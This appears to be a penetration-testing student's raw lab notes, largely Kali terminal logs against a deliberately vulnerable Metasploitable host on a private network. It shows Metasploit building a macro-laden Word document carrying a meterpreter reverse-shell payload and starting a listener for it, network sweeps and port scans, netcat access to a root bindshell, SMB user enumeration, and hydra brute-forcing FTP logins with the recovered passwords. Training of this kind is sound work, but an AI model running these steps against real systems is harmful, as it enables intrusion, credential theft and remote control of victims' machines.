+   FILENAME        msf.docm         yes       The Office document macro file (docm)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.103.126  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word on Windows
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/fileformat/office_word_macro) > set FILENAME cpent_dump.docm
+FILENAME => cpent_dump.docm
+msf6 exploit(multi/fileformat/office_word_macro) > exploit
+
+[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
+[*] Injecting payload in document comments
+[*] Injecting macro and other required files in document
+[*] Finalizing docm: cpent_dump.docm
+[+] cpent_dump.docm stored at /home/kali/.msf4/local/cpent_dump.docm
+msf6 exploit(multi/fileformat/office_word_macro) > search multihandler
+[-] No results from search
+msf6 exploit(multi/fileformat/office_word_macro) > search exploit multihandler
+[-] No results from search
+msf6 exploit(multi/fileformat/office_word_macro) > search multi/handler
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
+   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
+   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
+   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
+
+
+Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence
+
+msf6 exploit(multi/fileformat/office_word_macro) > set 5
+[-] Unknown datastore option: 5.
+Usage: set [options] [name] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore.
+
+If setting a PAYLOAD, this command can take an index from `show payloads'.
+
+msf6 exploit(multi/fileformat/office_word_macro) > set exploit/multi/handler
+[-] Unknown datastore option: exploit/multi/handler.
+Usage: set [options] [name] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore.
+
+If setting a PAYLOAD, this command can take an index from `show payloads'.
+
+msf6 exploit(multi/fileformat/office_word_macro) > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > 
+msf6 exploit(multi/handler) > 
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > exploit
+
+[-] Msf::OptionValidateError The following options failed to validate: LHOST
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > set LHOST=192.168.103.126
+[-] Unknown datastore option: LHOST=192.168.103.126.
+Usage: set [options] [name] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore.
+
+If setting a PAYLOAD, this command can take an index from `show payloads'.
+
+msf6 exploit(multi/handler) > set LHOST 192.168.103.126
+LHOST => 192.168.103.126
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.103.126:4444 
+ 
+====================================================================
+
+# fping -aqg 192.168.103.0/24
+192.168.103.1
+192.168.103.101
+192.168.103.102
+192.168.103.104
+192.168.103.108
+192.168.103.113
+192.168.103.114
+192.168.103.117
+192.168.103.119
+192.168.103.123
+192.168.103.124
+192.168.103.125
+192.168.103.127
+192.168.103.128
+192.168.103.130
+192.168.103.133
+192.168.103.135
+192.168.103.142
+192.168.103.132
+192.168.103.152
+192.168.103.150
+192.168.103.158
+192.168.103.162
+192.168.103.163
+192.168.103.177
+===============ARP SCAN-------------------will work for local oly and not for public ip===
+
+─# arp-scan 192.168.103.0/24
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:96:a9:4b, IPv4: 192.168.103.128
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.103.1   c0:c5:20:58:9f:f0       Ruckus Wireless
+192.168.103.101 00:0c:29:8d:92:27       VMware, Inc.
+192.168.103.102 00:0c:29:bb:1e:f9       VMware, Inc.
+192.168.103.104 04:0e:3c:90:82:94       HP Inc.
+192.168.103.105 c4:65:16:9c:10:da       Hewlett Packard
+192.168.103.106 04:0e:3c:8f:f6:ff       HP Inc.
+192.168.103.107 c4:65:16:9b:95:49       Hewlett Packard
+192.168.103.108 0c:80:63:d9:53:36       TP-LINK TECHNOLOGIES CO.,LTD.
+192.168.103.109 04:0e:3c:8e:96:e7       HP Inc.
+192.168.103.112 04:0e:3c:96:69:ba       HP Inc.
+192.168.103.113 00:0c:29:6a:21:29       VMware, Inc.
+192.168.103.114 00:0c:29:52:9f:d0       VMware, Inc.
+192.168.103.115 04:0e:3c:8b:17:26       HP Inc.
+192.168.103.116 14:b3:1f:0d:25:95       Dell Inc.
+192.168.103.117 00:0c:29:9e:73:1b       VMware, Inc.
+192.168.103.118 04:0e:3c:8b:16:ed       HP Inc.
+192.168.103.119 00:0c:29:8f:ca:00       VMware, Inc.
+192.168.103.120 04:0e:3c:8f:f4:99       HP Inc.
+192.168.103.121 b0:0c:d1:66:ff:eb       Hewlett Packard
+192.168.103.122 04:0e:3c:90:7e:8b       HP Inc.
+192.168.103.125 04:0e:3c:8b:14:f9       HP Inc.
+192.168.103.123 00:0c:29:86:d1:3c       VMware, Inc.
+192.168.103.127 04:0e:3c:96:63:8e       HP Inc.
+192.168.103.129 04:0e:3c:8f:87:06       HP Inc.
+192.168.103.130 00:0c:29:3c:36:53       VMware, Inc.
+192.168.103.130 00:0c:29:fa:dd:2a       VMware, Inc. (DUP: 2)
+192.168.103.131 04:0e:3c:8b:17:2b       HP Inc.
+192.168.103.133 00:0c:29:9c:8f:15       VMware, Inc.
+192.168.103.134 04:0e:3c:8d:f8:c2       HP Inc.
+192.168.103.135 00:0c:29:d1:eb:f4       VMware, Inc.
+192.168.103.136 04:0e:3c:95:cb:79       HP Inc.
+192.168.103.138 04:0e:3c:95:ca:49       HP Inc.
+192.168.103.142 00:0c:29:d8:01:02       VMware, Inc.
+192.168.103.150 00:0c:29:8b:b4:09       VMware, Inc.
+192.168.103.148 c4:65:16:9c:10:58       Hewlett Packard
+192.168.103.152 00:0c:29:bc:e4:bd       VMware, Inc.
+192.168.103.155 c4:65:16:9b:8f:c0       Hewlett Packard
+192.168.103.158 00:0c:29:5c:3d:4d       VMware, Inc.
+192.168.103.161 04:0e:3c:90:7d:5c       HP Inc.
+192.168.103.163 04:0e:3c:95:cc:5a       HP Inc.
+192.168.103.162 04:0e:3c:8f:87:6f       HP Inc.
+192.168.103.132 50:3d:c6:27:d7:50       Xiaomi Communications Co Ltd
+192.168.103.126 c4:23:60:47:fd:42       Intel Corporate
+192.168.103.172 04:0e:3c:8b:17:5a       HP Inc.
+192.168.103.177 04:0e:3c:8b:17:08       HP Inc.
+192.168.103.179 04:0e:3c:8b:12:dc       HP Inc.
+192.168.103.184 c4:65:16:9b:95:76       Hewlett Packard
+192.168.103.186 04:0e:3c:8b:17:57       HP Inc.
+
+48 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.926 seconds (132.92 hosts/sec). 47 responded
+                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─# 
+===========================================Netdiscover=================================================================Passive===
+┌──(root㉿kali)-[~]
+└─# netdiscover -r  192.168.103.0/24
+8d:92:27      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.102 00:0c:29:bb:1e:f9      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.104 04:0e:3c:90:82:94      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.105 c4:65:16:9c:10:da      1      60  Hewlett Packard                                                                                                                                        
+ 192.168.103.106 04:0e:3c:8f:f6:ff      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.107 c4:65:16:9b:95:49      1      60  Hewlett Packard                                                                                                                                        
+ 192.168.103.108 0c:80:63:d9:53:36      1      60  TP-LINK TECHNOLOGIES CO.,LTD.                                                                                                                          
+ 192.168.103.109 04:0e:3c:8e:96:e7      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.112 04:0e:3c:96:69:ba      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.113 00:0c:29:6a:21:29      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.114 00:0c:29:52:9f:d0      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.115 04:0e:3c:8b:17:26      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.116 14:b3:1f:0d:25:95      1      60  Dell Inc.                                                                                                                                              
+ 192.168.103.117 00:0c:29:9e:73:1b      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.118 04:0e:3c:8b:16:ed      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.119 00:0c:29:8f:ca:00      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.120 04:0e:3c:8f:f4:99      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.121 b0:0c:d1:66:ff:eb      1      60  Hewlett Packard                                                                                                                                        
+ 192.168.103.122 04:0e:3c:90:7e:8b      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.123 00:0c:29:86:d1:3c      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.125 04:0e:3c:8b:14:f9      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.127 04:0e:3c:96:63:8e      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.130 00:0c:29:3c:36:53      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.130 00:0c:29:fa:dd:2a      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.131 04:0e:3c:8b:17:2b      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.133 00:0c:29:9c:8f:15      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.134 04:0e:3c:8d:f8:c2      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.135 00:0c:29:d1:eb:f4      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.136 04:0e:3c:95:cb:79      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.138 04:0e:3c:95:ca:49      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.142 00:0c:29:d8:01:02      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.148 c4:65:16:9c:10:58      1      60  Hewlett Packard                                                                                                                                        
+ 192.168.103.150 00:0c:29:8b:b4:09      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.152 00:0c:29:bc:e4:bd      1      60  VMware, Inc.                                                                                                                                           
+ 192.168.103.155 c4:65:16:9b:8f:c0      1      60  Hewlett Packard                                                                                                                                        
+ 192.168.103.158 00:0c:29:5c:3d:4d     55    3300  VMware, Inc.                                                                                                                                           
+ 192.168.103.161 04:0e:3c:90:7d:5c      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.162 04:0e:3c:8f:87:6f      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.163 04:0e:3c:95:cc:5a      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.172 04:0e:3c:8b:17:5a      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.177 04:0e:3c:8b:17:08      1      60  HP Inc.                                                                                                                                                
+ 192.168.103.179 04:0e:3c:8b:12:dc      1      60  HP Inc.                                                                                                                                                
+
+                                                                                                                                                                                                           
+
+==========================net discover passive===================
+┌──(root㉿kali)-[~]
+└─# netdiscover -p -i eth0
+                                                                                                                                                                                                
+ 0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0                                                                                                                                            
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+
+  =============================                                                                                                                                                                                            
+
+
+PART-1:
+*nMAP IN NORMAL DISCOVER AND ROOT USER IS DIFFERENT.
+-->NORMAL USER 
+		-->PORT 80 AND 443 syn SCAN(TCP connect scan)
+---> SUPER USER IT WILL DO  ARP SCAN`
+		-->IF ARP IS DISABLED THEN 
+				SYN 443  (SYN SCAN)
+				ACk 80
+				ICMP ECHO REQUEST
+				ICMP TIMESTAMP  ----Pn then skips all this host discovery.
+
+nmap <IP> --disable--arp-ping
+PART-2:
+with common known ports only for ST scan.[1000 ports , can be random or use config /user/share/nmap/nmap-services]
+sS -- half open scan /stealth scan as root user
+sT -- is TCP connect or full scan as non-root
+
+nmap 192.168.0.120 -Pn -n --top-ports 10 ###least probing
+
+1.Inverse scan to determine OS and confirm the details about the target.
+-sN  OPEN | FILTERED for LINUX but windows sends RST means closed.========>very important
+-sF 
+-sX ---it is faster then as flags are enabled and enabled
+-sA
+
+
+RST: CLOSED
+SYN/ACK: OPEN
+No response : OPEN| FILTERED (-sN, -sF , -sX)
+-n skip Dns
+-Pn skip host discovery
+
+ACK Packet: Firewall detection
+==================================
+no reponse means filtered.
+unfiltered menas no firewall.
+
+
+# nmap 192.168.103.135 -sV
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 05:08 EDT
+Nmap scan report for 192.168.103.135
+Host is up (0.0019s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:D1:EB:F4 (VMware)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[/usr/share/nmap]
+	
+	
+
+from linux
+=========
+(root㉿kali)-[~]
+└─# nc 127.0.0.1 1234            
+hello
+
+
+kali machine--source
+===================
+# nc -lvp 1234                 
+listening on [any] 1234 ...
+connect to [1
+
+to check of open ports:
+==========================
+─# nc -v -n -z 192.168.103.135 20-80
+(UNKNOWN) [192.168.103.135] 80 (http) open
+(UNKNOWN) [192.168.103.135] 53 (domain) open
+(UNKNOWN) [192.168.103.135] 25 (smtp) open
+(UNKNOWN) [192.168.103.135] 23 (telnet) open
+(UNKNOWN) [192.168.103.135] 22 (ssh) open
+(UNKNOWN) [192.168.103.135] 21 (ftp) open
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[/usr/share/nmap]
+└─# 
+
+                                                                                                                                                                                                                 
+┌──(root㉿kali)-[/usr/share/nmap]
+└─# nc 192.168.103.135 1524          
+root@metasploitable:/# 
+root@metasploitable:/# 
+
+
+└─# hping3 -8 20-80 -S 192.168.103.135 
+Scanning 192.168.103.135 (192.168.103.135), port 20-80
+61 ports to scan, use -V to see all the replies
++----+-----------+---------+---+-----+-----+-----+
+|port| serv name |  flags  |ttl| id  | win | len |
++----+-----------+---------+---+-----+-----+-----+
+   21 ftp        : .S..A...  64     0  5840    46
+   22 ssh        : .S..A...  64     0  5840    46
+   23 telnet     : .S..A...  64     0  5840    46
+   25 smtp       : .S..A...  64     0  5840    46
+   53 domain     : .S..A...  64     0  5840    46
+   80 http       : .S..A...  64     0  5840    46
+All replies received. Done.
+Not responding ports: 
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[/usr/share/nmap]
+└─# 
+
+
+
+──(root㉿kali)-[~]
+└─# dmitry -pb 192.168.103.135
+Deepmagic Information Gathering Tool
+"There be some deep magic going on"
+
+ERROR: Unable to locate Host Name for 192.168.103.135
+Continuing with limited modules
+HostIP:192.168.103.135
+HostName:
+
+Gathered TCP Port information for 192.168.103.135
+---------------------------------
+
+ Port           State
+
+21/tcp          open
+>> 220 (vsFTPd 2.3.4)
+
+22/tcp          open
+>> SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+
+23/tcp          open
+>> ��▒�� ��#��'
+25/tcp          open
+>> 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+
+53/tcp          open
+zsh: segmentation fault  dmitry -pb 192.168.103.135
+                                                       
+													   
+													   
+Banner grabbing:
+==================												   
+
+──(root㉿kali)-[~]
+└─# nc 192.168.103.135 22              
+SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+
+
+-A uses script scan
+
+or======>
+
+# nmap -Pn -n -p21 192.168.103.135 -sV -sC
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 05:46 EDT
+Nmap scan report for 192.168.103.135
+Host is up (0.00028s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.103.128
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+MAC Address: 00:0C:29:D1:EB:F4 (VMware)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
+                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─#
+
+
+┌──(root㉿kali)-[~]
+└─# ftp 192.168.103.135
+Connected to 192.168.103.135.
+220 (vsFTPd 2.3.4)
+Name (192.168.103.135:kali): ftp/anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+ 
+
+                                                                                                                                                                                                                  
+┌──(root㉿kali)-[~]
+└─# crunch 3 6 > 1.txt
+Crunch will now generate the following amount of data: 2236053872 bytes
+2132 MB
+2 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 321271704 
+
+
+
+# enum4linux 192.168.103.135  ####only if SMN 445 or 139 is enabled
+
+
+└─# enum4linux -U 192.168.103.135           
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 15 06:06:00 2023
+
+ =========================================( Target Information )=========================================
+                                                                                                                                                                                                           
+Target ........... 192.168.103.135                                                                                                                                                                         
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==========================( Enumerating Workgroup/Domain on 192.168.103.135 )==========================
+                                                                                                                                                                                                           
+                                                                                                                                                                                                           
+[+] Got domain/workgroup name: WORKGROUP                                                                                                                                                                   
+                                                                                                                                                                                                           
+                                                                                                                                                                                                           
+ ==================================( Session Check on 192.168.103.135 )==================================
+                                                                                                                                                                                                           
+                                                                                                                                                                                                           
+[+] Server 192.168.103.135 allows sessions using username '', password ''                                                                                                                                  
+                                                                                                                                                                                                           
+                                                                                                                                                                                                           
+ ===============================( Getting domain SID for 192.168.103.135 )===============================
+                                                                                                                                                                                                           
+Domain Name: WORKGROUP                                                                                                                                                                                     
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                       
+                                                                                                                                                                                                           
+                                                                                                                                                                                                           
+ ======================================( Users on 192.168.103.135 )======================================
+                                                                                                                                                                                                           
+index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                                                                                                                       
+index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
+index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
+index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
+index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
+index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
+index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
+index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
+index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
+index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
+index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
+index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
+index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
+index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
+index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
+index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
+index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
+index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
+index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
+index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
+index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
+index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
+index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
+index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
+index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
+index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
+index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
+index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
+index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
+index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
+index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
+index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
+index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
+index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
+index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)
+
+user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0x4b4]
+user:[user] rid:[0xbba]
+user:[www-data] rid:[0x42a]
+user:[root] rid:[0x3e8]
+user:[news] rid:[0x3fa]
+user:[postgres] rid:[0x4c0]
+user:[bin] rid:[0x3ec]
+user:[mail] rid:[0x3f8]
+user:[distccd] rid:[0x4c6]
+user:[proftpd] rid:[0x4ca]
+user:[dhcp] rid:[0x4b2]
+user:[daemon] rid:[0x3ea]
+user:[sshd] rid:[0x4b8]
+user:[man] rid:[0x3f4]
+user:[lp] rid:[0x3f6]
+user:[mysql] rid:[0x4c2]
+user:[gnats] rid:[0x43a]
+user:[libuuid] rid:[0x4b0]
+user:[backup] rid:[0x42c]
+user:[msfadmin] rid:[0xbb8]
+user:[telnetd] rid:[0x4c8]
+user:[sys] rid:[0x3ee]
+user:[klog] rid:[0x4b6]
+user:[postfix] rid:[0x4bc]
+user:[service] rid:[0xbbc]
+user:[list] rid:[0x434]
+user:[irc] rid:[0x436]
+user:[ftp] rid:[0x4be]
+user:[tomcat55] rid:[0x4c4]
+user:[sync] rid:[0x3f0]
+user:[uucp] rid:[0x3fc]
+enum4linux complete on Sat Apr 15 06:06:01 2023
+
+                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─# 
+
+
+└─# enum4linux  192.168.103.135 | grep -i user: | cut -d [ -f 2 | cut -d ] -f 1
+games
+nobody
+bind
+proxy
+syslog
+user
+www-data
+root
+news
+postgres
+bin
+mail
+distccd
+proftpd
+dhcp
+daemon
+sshd
+man
+lp
+mysql
+gnats
+libuuid
+backup
+msfadmin
+telnetd
+sys
+klog
+postfix
+service
+list
+irc
+ftp
+tomcat55
+sync
+uucp
+
+
+─(root㉿kali)-[~]
+└─# hydra -L words.txt -e nsr ftp://192.168.103.135:21
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-15 06:12:07
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:35/p:3), ~7 tries per task
+[DATA] attacking ftp://192.168.103.135:21/
+[21][ftp] host: 192.168.103.135   login: user   password: user
+[21][ftp] host: 192.168.103.135   login: postgres   password: postgres
+[21][ftp] host: 192.168.103.135   login: msfadmin   password: msfadmin
+[21][ftp] host: 192.168.103.135   login: service   password: service
+[21][ftp] host: 192.168.103.135   login: ftp   password: ftp
+[21][ftp] host: 192.168.103.135   login: ftp
+[21][ftp] host: 192.168.103.135   login: ftp   password: ptf
+1 of 1 target successfully completed, 7 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-15 06:12:29
+                                                                                                                                                                                                           
+┌──(root㉿kali)-[~]
+└─# 
+
+┌──(root㉿kali)-[~]
+└─# ftp 192.168.103.135
+Connected to 192.168.103.135.
+220 (vsFTPd 2.3.4)
+Name (192.168.103.135:kali): msfadmin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||39052|).
+150 Here comes the directory listing.
+drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable
+226 Directory send OK.
+ftp> 
+
+
+──(root㉿kali)-[~]
+└─# hydra -L words.txt -P words.txt  ftp://192.168.103.135:21 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-15 06:35:09
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1225 login tries (l:35/p:35), ~77 tries per task
+[DATA] attacking ftp://192.168.103.135:21/
+[21][ftp] host: 192.168.103.135   login: user   password: user
+
+
+# locate *.nse | grep ftp
+/usr/share/nmap/scripts/ftp-anon.nse
+/usr/share/nmap/scripts/ftp-bounce.nse
+/usr/share/nmap/scripts/ftp-brute.nse
+/usr/share/nmap/scripts/ftp-libopie.nse
